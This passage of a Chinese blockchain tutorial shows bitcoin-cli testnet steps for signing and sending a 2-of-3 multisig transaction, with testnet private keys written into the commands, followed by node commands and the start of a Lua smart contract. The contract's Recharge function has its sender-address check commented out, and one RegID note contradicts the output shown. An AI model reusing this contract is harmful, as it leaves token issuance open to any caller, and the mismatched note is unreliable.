          "2N3uMQJm7WgsyHsnmoQS8d8eDKBco1LHzWx"
        ]
      }
    },
    {
      "value": 0.52700000,
      "n": 1,
      "scriptPubKey": {
        "asm": "OP_HASH160 30b5e8e9151e46be789562580b0118911d875f3d OP_EQUAL",
        "hex": "a91430b5e8e9151e46be789562580b0118911d875f3d87",
        "reqSigs": 1,
        "type": "scripthash",
        "addresses": [
          "2MwgnLokB4WA9NLNd6yL36AvPHHVChDh5r3"
        ]
      }
    }
  ]
}
```

查看未花费输出

```bash
root@ubuntu:~# bitcoin-cli -testnet listunspent 0 1000000 "[\"2MwgnLokB4WA9NLNd6yL36AvPHHVChDh5r3\"]"
[
  {
    "txid": "5332ed1482e665c6f7146283991ad69c05af99cfebab344729d54b382f68a46c",
    "vout": 1,
    "address": "2MwgnLokB4WA9NLNd6yL36AvPHHVChDh5r3",
    "label": "test account",
    "redeemScript": "0020fe2c7d8886d6dacaec530916a108ad2dd040fbf72c80ea3ddd6d4f220e7e8b3a",
    "scriptPubKey": "a91430b5e8e9151e46be789562580b0118911d875f3d87",
    "amount": 0.52700000,
    "confirmations": 619,
    "spendable": true,
    "solvable": true,
    "safe": true
  }
]
```

生成一个新地址

```bash
root@ubuntu:~# bitcoin-cli -testnet getnewaddress
2NDYvTxmsRmyPw612KwBGCqLNsBRQSDpjXL
```

使用上述 2-3 多签未花费输出向地址 `2NDYvTxmsRmyPw612KwBGCqLNsBRQSDpjXL` 转账 0.5269 BTC

```bash
root@ubuntu:~# bitcoin-cli -testnet createrawtransaction "[{\"txid\":\"5332ed1482e665c6f7146283991ad69c05af99cfebab344729d54b382f68a46c\",\"vout\":1}]" "[{\"2NDYvTxmsRmyPw612KwBGCqLNsBRQSDpjXL\":0.5269}]"
02000000016ca4682f384bd5294734abebcf99af059cd61a99836214f7c665e68214ed32530100000000ffffffff0150fc23030000000017a914debb602e1c37628d1f411918f87f1680d59e1a0f8700000000
```

如果只是用一个私钥去签名交易（2-3 多签中至少需要 2 个有效私钥），失败信息如下

```bash
root@ubuntu:~# bitcoin-cli -testnet signrawtransactionwithkey 02000000016ca4682f384bd5294734abebcf99af059cd61a99836214f7c665e68214ed32530100000000ffffffff0150fc23030000000017a914debb602e1c37628d1f411918f87f1680d59e1a0f8700000000 "[\"cPegPf2xaeaqYB9kqqM2gzVPPXnAmwCME2KjsAQG6gkVnbxZpTKo\"]" "[{\"txid\":\"5332ed1482e665c6f7146283991ad69c05af99cfebab344729d54b382f68a46c\", \"vout\":1, \"scriptPubKey\": \"a91430b5e8e9151e46be789562580b0118911d875f3d87\", \"redeemScript\": \"522102f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46210256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d210269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b553ae\", \"amount\": 0.52700000}]"
{
  "hex": "020000000001016ca4682f384bd5294734abebcf99af059cd61a99836214f7c665e68214ed32530100000023220020fe2c7d8886d6dacaec530916a108ad2dd040fbf72c80ea3ddd6d4f220e7e8b3affffffff0150fc23030000000017a914debb602e1c37628d1f411918f87f1680d59e1a0f870300473044022074f1b0daaba84a5192a4d5eed4c8b792f8b6a063efb612176aa49837582b925f022068c110b40c505af6bfafb5bf4ea7008e0a2697d189b2498290818803ea6341a10169522102f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46210256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d210269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b553ae00000000",
  "complete": false,
  "errors": [
    {
      "txid": "5332ed1482e665c6f7146283991ad69c05af99cfebab344729d54b382f68a46c",
      "vout": 1,
      "witness": [
        "",
        "3044022074f1b0daaba84a5192a4d5eed4c8b792f8b6a063efb612176aa49837582b925f022068c110b40c505af6bfafb5bf4ea7008e0a2697d189b2498290818803ea6341a101",
        "522102f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46210256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d210269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b553ae"
      ],
      "scriptSig": "220020fe2c7d8886d6dacaec530916a108ad2dd040fbf72c80ea3ddd6d4f220e7e8b3a",
      "sequence": 4294967295,
      "error": "Unable to sign input, invalid stack size (possibly missing key)"
    }
  ]
}
```

如果使用一个有效私钥，一个无效私钥（`cVCHvKPezAr4gNCP5uLcDUcUP7kbydWAhV7CizA9V5QrNSKSRfXh` 钱包中无此私钥）去签名交易，失败信息如下

```bash
root@ubuntu:~# bitcoin-cli -testnet signrawtransactionwithkey 02000000016ca4682f384bd5294734abebcf99af059cd61a99836214f7c665e68214ed32530100000000ffffffff0150fc23030000000017a914debb602e1c37628d1f411918f87f1680d59e1a0f8700000000 "[\"cPegPf2xaeaqYB9kqqM2gzVPPXnAmwCME2KjsAQG6gkVnbxZpTKo\", \"cVCHvKPezAr4gNCP5uLcDUcUP7kbydWAhV7CizA9V5QrNSKSRfXh\"]" "[{\"txid\":\"5332ed1482e665c6f7146283991ad69c05af99cfebab344729d54b382f68a46c\", \"vout\":1, \"scriptPubKey\": \"a91430b5e8e9151e46be789562580b0118911d875f3d87\", \"redeemScript\": \"522102f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46210256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d210269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b553ae\", \"amount\": 0.52700000}]"
{
  "hex": "020000000001016ca4682f384bd5294734abebcf99af059cd61a99836214f7c665e68214ed32530100000023220020fe2c7d8886d6dacaec530916a108ad2dd040fbf72c80ea3ddd6d4f220e7e8b3affffffff0150fc23030000000017a914debb602e1c37628d1f411918f87f1680d59e1a0f870300473044022074f1b0daaba84a5192a4d5eed4c8b792f8b6a063efb612176aa49837582b925f022068c110b40c505af6bfafb5bf4ea7008e0a2697d189b2498290818803ea6341a10169522102f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46210256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d210269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b553ae00000000",
  "complete": false,
  "errors": [
    {
      "txid": "5332ed1482e665c6f7146283991ad69c05af99cfebab344729d54b382f68a46c",
      "vout": 1,
      "witness": [
        "",
        "3044022074f1b0daaba84a5192a4d5eed4c8b792f8b6a063efb612176aa49837582b925f022068c110b40c505af6bfafb5bf4ea7008e0a2697d189b2498290818803ea6341a101",
        "522102f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46210256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d210269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b553ae"
      ],
      "scriptSig": "220020fe2c7d8886d6dacaec530916a108ad2dd040fbf72c80ea3ddd6d4f220e7e8b3a",
      "sequence": 4294967295,
      "error": "Unable to sign input, invalid stack size (possibly missing key)"
    }
  ]
}
```

使用两个有效私钥签名交易，成功信息如下

```bash
root@ubuntu:~# bitcoin-cli -testnet signrawtransactionwithkey 02000000016ca4682f384bd5294734abebcf99af059cd61a99836214f7c665e68214ed32530100000000ffffffff0150fc23030000000017a914debb602e1c37628d1f411918f87f1680d59e1a0f8700000000 "[\"cPegPf2xaeaqYB9kqqM2gzVPPXnAmwCME2KjsAQG6gkVnbxZpTKo\", \"cQ8ZUeBy27NKafYioHp4f3isHFTFuAx65vPf6dgUgxdNSBegsW3W\"]" "[{\"txid\":\"5332ed1482e665c6f7146283991ad69c05af99cfebab344729d54b382f68a46c\", \"vout\":1, \"scriptPubKey\": \"a91430b5e8e9151e46be789562580b0118911d875f3d87\", \"redeemScript\": \"522102f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46210256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d210269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b553ae\", \"amount\": 0.52700000}]"
{
  "hex": "020000000001016ca4682f384bd5294734abebcf99af059cd61a99836214f7c665e68214ed32530100000023220020fe2c7d8886d6dacaec530916a108ad2dd040fbf72c80ea3ddd6d4f220e7e8b3affffffff0150fc23030000000017a914debb602e1c37628d1f411918f87f1680d59e1a0f870400473044022074f1b0daaba84a5192a4d5eed4c8b792f8b6a063efb612176aa49837582b925f022068c110b40c505af6bfafb5bf4ea7008e0a2697d189b2498290818803ea6341a10147304402206a9afcb4b3865532668a895de297de9b1a0c6fd3c42be94777c140bbd19b1c5202200c3068b4b1286cac0b49aaaa16a8fadf6bdc4e4abed3719f2030e14afa2e2e3b0169522102f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46210256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d210269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b553ae00000000",
  "complete": true
}
```

解码原始交易信息

```bash
root@ubuntu:~# bitcoin-cli -testnet decoderawtransaction 020000000001016ca4682f384bd5294734abebcf99af059cd61a99836214f7c665e68214ed32530100000023220020fe2c7d8886d6dacaec530916a108ad2dd040fbf72c80ea3ddd6d4f220e7e8b3affffffff0150fc23030000000017a914debb602e1c37628d1f411918f87f1680d59e1a0f870400473044022074f1b0daaba84a5192a4d5eed4c8b792f8b6a063efb612176aa49837582b925f022068c110b40c505af6bfafb5bf4ea7008e0a2697d189b2498290818803ea6341a10147304402206a9afcb4b3865532668a895de297de9b1a0c6fd3c42be94777c140bbd19b1c5202200c3068b4b1286cac0b49aaaa16a8fadf6bdc4e4abed3719f2030e14afa2e2e3b0169522102f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46210256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d210269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b553ae00000000
{
  "txid": "05dfc6503286f2472246ea43cdcf3004d0553df8da2635a42eaf2c321b889a03",
  "hash": "024b94200522250ef2b63da12062eec63d9476c13e4545f36b2592eaa9bb2422",
  "version": 2,
  "size": 372,
  "vsize": 182,
  "weight": 726,
  "locktime": 0,
  "vin": [
    {
      "txid": "5332ed1482e665c6f7146283991ad69c05af99cfebab344729d54b382f68a46c",
      "vout": 1,
      "scriptSig": {
        "asm": "0020fe2c7d8886d6dacaec530916a108ad2dd040fbf72c80ea3ddd6d4f220e7e8b3a",
        "hex": "220020fe2c7d8886d6dacaec530916a108ad2dd040fbf72c80ea3ddd6d4f220e7e8b3a"
      },
      "txinwitness": [
        "",
        "3044022074f1b0daaba84a5192a4d5eed4c8b792f8b6a063efb612176aa49837582b925f022068c110b40c505af6bfafb5bf4ea7008e0a2697d189b2498290818803ea6341a101",
        "304402206a9afcb4b3865532668a895de297de9b1a0c6fd3c42be94777c140bbd19b1c5202200c3068b4b1286cac0b49aaaa16a8fadf6bdc4e4abed3719f2030e14afa2e2e3b01",
        "522102f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46210256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d210269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b553ae"
      ],
      "sequence": 4294967295
    }
  ],
  "vout": [
    {
      "value": 0.52690000,
      "n": 0,
      "scriptPubKey": {
        "asm": "OP_HASH160 debb602e1c37628d1f411918f87f1680d59e1a0f OP_EQUAL",
        "hex": "a914debb602e1c37628d1f411918f87f1680d59e1a0f87",
        "reqSigs": 1,
        "type": "scripthash",
        "addresses": [
          "2NDYvTxmsRmyPw612KwBGCqLNsBRQSDpjXL"
        ]
      }
    }
  ]
}
```

> 解码锁定脚本

```bash
root@ubuntu:~# bitcoin-cli -testnet decodescript 0020fe2c7d8886d6dacaec530916a108ad2dd040fbf72c80ea3ddd6d4f220e7e8b3a
{
  "asm": "0 fe2c7d8886d6dacaec530916a108ad2dd040fbf72c80ea3ddd6d4f220e7e8b3a",
  "reqSigs": 1,
  "type": "witness_v0_scripthash",
  "addresses": [
    "tb1qlck8mzyx6mdv4mznpyt2zz9d9hgyp7lh9jqw50wad48jyrn73vaqvvpppr"
  ],
  "p2sh": "2MwgnLokB4WA9NLNd6yL36AvPHHVChDh5r3"
}
```

> 解码赎回脚本

```bash
root@ubuntu:~# bitcoin-cli -testnet decodescript 522102f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46210256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d210269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b553ae
{
  "asm": "2 02f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46 0256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d 0269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b5 3 OP_CHECKMULTISIG",
  "reqSigs": 2,
  "type": "multisig",
  "addresses": [
    "mzzsUyocJXwrbQi13k1YVYuvUPKUL6H2Gz",
    "myX8p3UGzyxJDEGxdBd3LouRjPahjpPvs4",
    "mn6U9CQDBa5qM5WAg7KZQA9v4Z119UBCCZ"
  ],
  "p2sh": "2N5pft6YKrBmTi3UW3LXkaxjGFr9SQ2U3bE",
  "segwit": {
    "asm": "0 fe2c7d8886d6dacaec530916a108ad2dd040fbf72c80ea3ddd6d4f220e7e8b3a",
    "hex": "0020fe2c7d8886d6dacaec530916a108ad2dd040fbf72c80ea3ddd6d4f220e7e8b3a",
    "reqSigs": 1,
    "type": "witness_v0_scripthash",
    "addresses": [
      "tb1qlck8mzyx6mdv4mznpyt2zz9d9hgyp7lh9jqw50wad48jyrn73vaqvvpppr"
    ],
    "p2sh-segwit": "2MwgnLokB4WA9NLNd6yL36AvPHHVChDh5r3"
  }
}
```

发送原始交易

```bash
root@ubuntu:~# bitcoin-cli -testnet sendrawtransaction 020000000001016ca4682f384bd5294734abebcf99af059cd61a99836214f7c665e68214ed32530100000023220020fe2c7d8886d6dacaec530916a108ad2dd040fbf72c80ea3ddd6d4f220e7e8b3affffffff0150fc23030000000017a914debb602e1c37628d1f411918f87f1680d59e1a0f870400473044022074f1b0daaba84a5192a4d5eed4c8b792f8b6a063efb612176aa49837582b925f022068c110b40c505af6bfafb5bf4ea7008e0a2697d189b2498290818803ea6341a10147304402206a9afcb4b3865532668a895de297de9b1a0c6fd3c42be94777c140bbd19b1c5202200c3068b4b1286cac0b49aaaa16a8fadf6bdc4e4abed3719f2030e14afa2e2e3b0169522102f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46210256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d210269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b553ae00000000
05dfc6503286f2472246ea43cdcf3004d0553df8da2635a42eaf2c321b889a03
```

查看交易信息

多签地址 `2MwgnLokB4WA9NLNd6yL36AvPHHVChDh5r3` 包含两笔交易：

- 向多签地址转账 0.527 BTC
- 从多签地址转出 0.5269 BTC

![](pic/blockchain/get_transaction2.png)

```bash
root@ubuntu:~# bitcoin-cli -testnet gettransaction 05dfc6503286f2472246ea43cdcf3004d0553df8da2635a42eaf2c321b889a03
{
  "amount": 0.00000000,
  "fee": -0.00010000,
  "confirmations": 2,
  "blockhash": "0000000000000bd3197bd8bc87460937ff77b091b16233a1720fb1448da2f34d",
  "blockindex": 6,
  "blocktime": 1539334017,
  "txid": "05dfc6503286f2472246ea43cdcf3004d0553df8da2635a42eaf2c321b889a03",
  "walletconflicts": [
  ],
  "time": 1539333939,
  "timereceived": 1539333939,
  "bip125-replaceable": "no",
  "details": [
    {
      "address": "2NDYvTxmsRmyPw612KwBGCqLNsBRQSDpjXL",
      "category": "send",
      "amount": -0.52690000,
      "label": "",
      "vout": 0,
      "fee": -0.00010000,
      "abandoned": false
    },
    {
      "address": "2NDYvTxmsRmyPw612KwBGCqLNsBRQSDpjXL",
      "category": "receive",
      "amount": 0.52690000,
      "label": "",
      "vout": 0
    }
  ],
  "hex": "020000000001016ca4682f384bd5294734abebcf99af059cd61a99836214f7c665e68214ed32530100000023220020fe2c7d8886d6dacaec530916a108ad2dd040fbf72c80ea3ddd6d4f220e7e8b3affffffff0150fc23030000000017a914debb602e1c37628d1f411918f87f1680d59e1a0f870400473044022074f1b0daaba84a5192a4d5eed4c8b792f8b6a063efb612176aa49837582b925f022068c110b40c505af6bfafb5bf4ea7008e0a2697d189b2498290818803ea6341a10147304402206a9afcb4b3865532668a895de297de9b1a0c6fd3c42be94777c140bbd19b1c5202200c3068b4b1286cac0b49aaaa16a8fadf6bdc4e4abed3719f2030e14afa2e2e3b0169522102f396b11941706b0424499fbf679c3e5987a8d2bf5b47116ec60ceb4f71804d46210256c0ec8ee73ba5fff9b12910880c12be9ff7d15f1f1b5d64685c3bcbdeb6734d210269321ca40da82f1fb8da8932b25beb96b4a84e6af593e89ee64e4c3f867eb7b553ae00000000"
}
```

### 智能坊合约开发

#### 获取基本信息

```bash
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getinfo
{
    "version" : 1000009,
    "fullversion" : "v1.0.0.9-unk-release-linux (Jun 25 2018, 14:00:42)",
    "protocolversion" : 10001,
    "walletversion" : 0,
    "balance" : 207900000.00000000,
    "blocks" : 147,
    "timeoffset" : 0,
    "connections" : 20,
    "proxy" : "",
    "nettype" : "REGTEST_NET",
    "chainwork" : "0000000000000000000000000000000000000000000000000000000000000093",
    "tipblocktime" : 1529917110,
    "paytxfee" : 0.00010000,
    "relayfee" : 0.00001000,
    "fuelrate" : 1,
    "fuel" : 0,
    "data directory" : "/root/wikichain/tmp/node1/./regtest",
    "syncheight" : 147,
    "tip block hash" : "17142e0ea57dfc941b2af5cf1c8b971a4444b95b13bc148b01b6fe8e5fc29eeb",
    "errors" : ""
}
```

#### 获取地址列表

```bash
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. listaddr
[
    {
        "addr" : "wLKf2NqwtHk3BfzK5wMDfbKYN1SC3weyR4",
        "balance" : 207900000.00000000,
        "haveminerkey" : false,
        "regid" : "0-1"
    },
    {
        "addr" : "wNDue1jHcgRSioSDL4o1AzXz3D72gCMkP6",
        "balance" : 0.00000000,
        "haveminerkey" : false,
        "regid" : "0-2"
    },
    {
        "addr" : "whi2S53LfKcn999VWWYULJJ2kVUWFTcPBW",
        "balance" : 0.00000000,
        "haveminerkey" : false,
        "regid" : " "
    }
]
```

#### 获取账户信息

```bash
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getaccountinfo wLKf2NqwtHk3BfzK5wMDfbKYN1SC3weyR4
{
    "Address" : "wLKf2NqwtHk3BfzK5wMDfbKYN1SC3weyR4",
    "KeyID" : "079b9296a00a2b655787fa90e66ec3cde4bf1c8c",
    "RegID" : "0-1",
    "PublicKey" : "036c5397f3227a1e209952829d249b7ad0f615e43b763ac15e3a6f52627a10df21",
    "MinerPKey" : "",
    "Balance" : 20790000000000000,
    "Votes" : 0,
    "UpdateHeight" : 0,
    "voteFundList" : [
        {
            "address" : "wNDue1jHcgRSioSDL4o1AzXz3D72gCMkP6",
            "value" : 210000000000000
        },
        {
            "address" : "wNuJM44FPC5NxearNLP98pg295VqP7hsqu",
            "value" : 210000000000000
        },
        {
            "address" : "wP64X59EoRmeq2M5GrJ23UVttE9uxnuoFa",
            "value" : 210000000000000
        },
        {
            "address" : "wQewSbKL5kAfpwnrivSiCcaiFffgNva4uB",
            "value" : 210000000000000
        },
        {
            "address" : "wQquTWgzNzLtjUV4Du57p9YAEGdKvgXs9t",
            "value" : 210000000000000
        },
        {
            "address" : "wRQwgYkPNe1oX9Ts3cfuQ4KerqiV2e8gqM",
            "value" : 210000000000000
        },
        {
            "address" : "wSjMDgKWHC2MzrUamhJtyyR2FTtw8oMUfx",
            "value" : 210000000000000
        },
        {
            "address" : "wSms4pZnNe7bxjouLxUXQLowc7JqtNps94",
            "value" : 210000000000000
        },
        {
            "address" : "wT75mYY9C8xgqVgXquBmEfRmAXPDpJHU62",
            "value" : 210000000000000
        },
        {
            "address" : "wUt89R4bjD3Ca6Vb7mk18oGsVtSTCxJu2q",
            "value" : 210000000000000
        },
        {
            "address" : "wVTUdfEaeAAVSuXKrmMyqQXH5j5Z9oGmTt",
            "value" : 210000000000000
        }
    ],
    "postion" : "inblock"
}
```

#### 生成测试地址、充值、激活地址

##### 生成测试地址

```bash
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getnewaddress
{
    "addr" : "wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC",
    "minerpubkey" : "no"
}
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getnewaddress
{
    "addr" : "whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1",
    "minerpubkey" : "no"
}
```

##### 充值

```bash
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. sendtoaddress wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC 100000000000
{
    "hash" : "334f447dfd284b2a084560f57d3c4ad044cde1fc41470c68ffeae55aefe270fb"
}
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. sendtoaddress whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1 100000000000
{
    "hash" : "2ab57b070aa87aac85afaf21fd18e4e4211017f7104ab18980ccef287d750012"
}

```

##### 查询余额

> 充值后，需要出块之后才能到账，可以通过查询交易信息确认是否到账，可以查询到包含上述交易 hash：
>
> `334f447dfd284b2a084560f57d3c4ad044cde1fc41470c68ffeae55aefe270fb`
>
> `2ab57b070aa87aac85afaf21fd18e4e4211017f7104ab18980ccef287d750012`

```bash
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. listtx
{
    "ConfirmTx" : [
        "2ab57b070aa87aac85afaf21fd18e4e4211017f7104ab18980ccef287d750012",
        "334f447dfd284b2a084560f57d3c4ad044cde1fc41470c68ffeae55aefe270fb",
        "8ebdb18e325ae00259e6072f5c5b403dd02c3b1847c16a3f59a2c3e46c4e5cb4",
        "f37c59ed4b4af2a85b072a823cd3c720a8fd39f8903138a1ff41d29579a9a78e",
        "bba67872503e0eeb65b83c8e932778e7aae7cd8b379645a5cb766a072a0ad561"
    ],
    "UnConfirmTx" : [
    ]
}
```

```bash
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getbalance wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC
{
    "balance" : 1000.00000000
}
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getbalance whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1
{
    "balance" : 1000.00000000
}
```

##### 激活地址

```bash
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. registaccounttx wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC 100000
{
    "hash" : "00d16a254cedfbb37a9073453b6e522250c7a0cdc70905e24cbdb0210eaf6bfa"
}
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. registaccounttx whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1 100000
{
    "hash" : "82ab10800ec73221e6f03620808a5e4cdb46554e71989b98679700302ec830ce"
}
```

##### 确认地址已激活

> **账户余额计算：**100000000000 - 100000 = 99999900000
>
> **根据字段 RegID 判断是否已激活：**RegID 分别为 446-1、448-1，表示该地址已激活。

```bash
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getaccountinfo wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC
{
    "Address" : "wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC",
    "KeyID" : "01650a07447041ce645146117803b58f02eedc6b",
    "RegID" : "71-1",
    "PublicKey" : "02c3f558fe4479a10139345b8f43e4a370edaffd7889ab33fa6e386a56d3608209",
    "MinerPKey" : "",
    "Balance" : 99999900000,
    "Votes" : 0,
    "UpdateHeight" : 0,
    "voteFundList" : [
    ],
    "postion" : "inblock"
}
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getaccountinfo whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1
{
    "Address" : "whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1",
    "KeyID" : "f2cb5a8df46bdbe2c7e82c544be69caef703ae50",
    "RegID" : "72-1",
    "PublicKey" : "0351ae1238e081dc24068eeb2131fc1d8680d2089c5939ceabe78cfc92f7d9fdf2",
    "MinerPKey" : "",
    "Balance" : 99999900000,
    "Votes" : 0,
    "UpdateHeight" : 0,
    "voteFundList" : [
    ],
    "postion" : "inblock"
}
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getbalance wKkoeBCynvuDmkS9XebY5vAUQC6aLVbznC
{
    "balance" : 999.99900000
}
root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getbalance whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1
{
    "balance" : 999.99900000
}
```

#### 注册应用脚本

##### 智能合约脚本

> 智能合约脚本实际为 lua 脚本，[点此下载](https://dudebing99.github.io/blog/archives/code_snippet/test.lua)

```lua
mylib = require "mylib"

--日志类型
LOG_TYPE =
{
   ENUM_STRING = 0, --字符串类型
   ENUM_NUMBER = 1, --数字类型
};

--系统账户操作定义
OPER_TYPE =
{
    ENUM_ADD_FREE = 1,   --系统账户加
    ENUM_MINUS_FREE = 2  --系统账户减
}

--脚本应用账户操作类型定义
APP_OPERATOR_TYPE =
{
    ENUM_ADD_FREE_OP = 1,      --自由账户加
    ENUM_SUB_FREE_OP = 2,      --自由账户减
    ENUM_ADD_FREEZED_OP = 3,   --冻结账户加
    ENUM_SUB_FREEZED_OP = 4    --冻结账户减
}

--账户类型
ADDR_TYPE =
{
    ENUM_REGID = 1,        -- REG_ID
    ENUM_BASE58 = 2,    -- BASE58 ADDR
}

--交易类型
TX_TYPE =
{
    TX_WITHDRAW = 1,    --提现
    TX_RECHARGE= 2,     --充值
}

FREEZE_MONTH_NUM = 20       -- 冻结次数
FREEZE_PERIOD = 5    -- 冻结周期

MAX_MONEY = 100000000000000000 -- 总金额限制
FREE_MONEY = 10000000000000000 -- 自由金额限制

gCheckAccount = true -- 平衡检查 true 打开，false 关闭

gSendAccountTbl =             -- 发币地址
{
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00
}

--判断表是否为空
function TableIsEmpty(t)
    return _G.next(t) == nil
end

--判断表非空
function TableIsNotEmpty(t)
    return false == TableIsEmpty(t)
end

--[[
  功能:日志输出
  参数：
    aKey:日志类型
    bLength:日志长度
    cValue：日志
--]]
function LogPrint(aKey,bLength,cValue)
    assert(bLength >= 1,"LogPrint bLength invlaid")
    if(aKey == LOG_TYPE.ENUM_STRING) then
      assert(type(cValue) == "string","LogPrint cValue invlaid0")
    elseif(aKey == LOG_TYPE.ENUM_NUMBER)     then
        assert(TableIsNotEmpty(cValue),"LogPrint cValue invlaid1")
    else
        error("LogPrint aKey invlaid")
    end

    local logTable = {
        key = LOG_TYPE.ENUM_STRING,
        length = 0,
        value = nil
    }
    logTable.key = aKey
    logTable.length = bLength
    logTable.value = cValue
    mylib.LogPrint(logTable)
end

--[[
  功能:遍历表元素
  参数：
    t:表
    i:开始索引
--]]
function Unpack(t,i)
   i = i or 1
   if t[i] then
     return t[i],Unpack(t,i+1)
   end
end

--[[
  功能:比较两表元素是否相同
  参数：
    tDest:表1
    tSrc:表2
    start1:开始索引
  返回值：
    0:相等
    1:表1>表2
    2:表1<表2
--]]
function MemCmp(tDest,tSrc,start1)
    assert(TableIsNotEmpty(tDest),"tDest is empty")
    assert(TableIsNotEmpty(tSrc),"tSrc is empty")
    local i
    for i = #tDest,1,-1 do
        if tDest[i] > tSrc[i + start1 - 1] then
            return 1
        elseif tDest[i] < tSrc[i + start1 - 1] then
            return -1
        end
    end
    return 0
end

--[[
  功能:获取表从开始索引指定长度的元素集合
  参数：
    tbl:表
    start:开始索引
    length:长度
  返回值：
    一个新表
--]]
function GetValueFromContract(tbl,start,length)
  assert(start > 0,"GetValueFromContract start err")
  assert(length > 0,"GetValueFromContract length err")
  local newTab = {}
    local i
    for i = 0,length -1 do
        newTab[1 + i] = tbl[start + i]
    end
    return newTab
end

--[[
  功能:充值
  参数：
    无
  返回值：
    true:成功
    false:失败
  流程：
    1）获取当前交易账户，并判断是否与发币地址一致
    2）获取合约相应内容，并判断合法性
    3）将自由金额提现到系统账户下
    4）冻结相应的冻结部分
    5）扣除相应的脚本账户下的金额
--]]
function Recharge()
    -- 1）
    -- local accountTbl = {0, 0, 0, 0, 0, 0}
    -- accountTbl = {mylib.GetCurTxAccount()}
    -- assert(TableIsNotEmpty(accountTbl),"GetCurTxAccount error")

    -- assert(MemCmp(gSendAccountTbl, accountTbl,1) == 0,"Recharge address err")

    -- 2）
    local toAddrTbl = {}
    toAddrTbl = GetValueFromContract(contract, 3, 34)

    local moneyTbl = {}
    moneyTbl = GetValueFromContract(contract, 37, 8)
    local money = mylib.ByteToInteger(Unpack(moneyTbl))
    assert(money > 0,"money <= 0")

    local freeMoneyTbl = {}
    freeMoneyTbl = GetValueFromContract(contract, 45, 8)
    local freeMoney = mylib.ByteToInteger(Unpack(freeMoneyTbl))
